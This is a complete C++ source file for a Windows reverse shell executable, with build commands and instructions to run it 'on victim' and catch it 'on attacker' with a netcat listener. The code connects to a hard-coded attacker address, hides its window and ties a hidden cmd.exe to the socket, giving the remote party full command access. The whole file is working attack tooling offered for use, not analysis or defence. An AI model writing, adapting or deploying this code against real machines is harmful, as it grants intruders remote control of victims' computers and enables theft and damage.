// revshell_pure.cpp — pure WinSock reverse shell EXE (no shellcode)
//
// Opens a TCP connection to LHOST:LPORT, spawns cmd.exe with its stdin/
// stdout/stderr tied to the socket. Works on any Windows that has WinSock2
// (every Windows since 2000).
//
// Build (MSVC, Developer PowerShell):
//   cl /EHsc /O2 /nologo revshell_pure.cpp /link ws2_32.lib /SUBSYSTEM:WINDOWS /Fe:revshell_pure.exe
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-g++ -O2 -s -mwindows -o revshell_pure.exe revshell_pure.cpp -lws2_32
//
// Run (on victim):
//   .\revshell_pure.exe
//
// Catch (on attacker):
//   nc -lvnp 4444
//
// Change LHOST + LPORT below before building.

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

// ===========================================================================
// EDIT THESE TWO
// ===========================================================================
static const char* LHOST = "10.0.0.5";      // attacker IP
static const int   LPORT = 4444;            // listener port
// ===========================================================================

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return 2; }

    sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((u_short)LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    // Simple reconnect loop. Remove the loop if you want fire-and-forget.
    for (int i = 0; i < 10; ++i) {
        if (connect(s, (sockaddr*)&sa, sizeof(sa)) != SOCKET_ERROR) break;
        Sleep(2000);
    }

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    PROCESS_INFORMATION pi = {};
    char cmd[] = "cmd.exe";
    if (!CreateProcessA(nullptr, cmd, nullptr, nullptr, TRUE,
                        0, nullptr, nullptr, &si, &pi)) {
        closesocket(s);
        WSACleanup();
        return 3;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    closesocket(s);
    WSACleanup();
    return 0;
}
